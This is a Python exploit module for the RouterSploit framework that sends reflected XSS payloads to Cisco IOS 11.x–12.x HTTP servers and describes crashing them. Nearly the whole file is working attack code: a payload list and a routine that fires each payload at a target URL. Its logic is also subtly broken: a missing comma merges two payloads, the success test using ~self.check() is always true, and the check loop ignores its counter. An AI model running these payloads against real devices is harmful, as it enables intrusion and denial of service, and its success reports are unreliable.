import re

from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    This exploit targets a vulnerability in the Cisco IOS HTTP Server.
    """
    __info__ = {
        'name': 'Cisco IOS 11.x and 12.x HTTP XSS',
        'description': 'Multi HTTP server for Cisco IOS 11.3 to 12.2 allows attackers \n'
                       'to make a refector XSS request. Attacker can exploit this\n'
                       'make Cisco Device IOS HTTP server crash or DoS.',
        'authors': [
            'Zloss' 
        ],
        'references': [
            'https://www.securityfocus.com/bid/33625/info',
        ],
        'devices': [
            'IOS 11.x and 12.x are reportedly vulnerable.',
        ],
        'id': 'sf-33625'
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port
    access_level = None
    # TODO: Test case effects, Array bounds access check!
    payloads = [
        '\"><body onload=alert(\"vulnerable-here!\")>',
        '\"<body onload=\"alert(\'vulnerable-here!\');\">'
        '?<script>alert(\"Running+code+within+the_context+of+\"%2bdocument.domain)</script>'
    ]

    response = None

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            url = "{}:{}/level/15/exec/-/{}".format(self.target, self.port, self.payloads[0])
            self.response = http_request(method="GET", url=url)
            if self.response is None:
                if ~self.check():
                    print_success("Exploit success!")
                    return True
            else:
                print_error("Exploit Failed! try another payload...")
            self.response = None
            url = "{}:{}/exec/{}".format(self.target, self.port, self.payloads[1])
            self.response = http_request(method="GET", url=url)
            if self.response is None:
                if ~self.check():
                    print_success("Exploit success!")
                    return True
            else:
                print_error("Exploit Failed! try another payload...")
            self.response = None
            url = "{}:{}/ping?{}".format(self.target, self.port, self.payloads[2])
            self.response = http_request(method="GET", url=url)
            if self.response is None:
                if ~self.check():
                    print_success("Exploit success!")
                    return True
            else:
                print_error("Exploit Failed! Target may not in suffer")
            self.response = None
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for num in range(16, 100):
            url = "{}:{}/".format(self.target, self.port, num)
            response = http_request(method="GET", url=url)
            if response is None:  # target does not respond
                break

            if response.status_code == 200:
                return True  # target is vulnerable

        return False  # target is not vulnerable
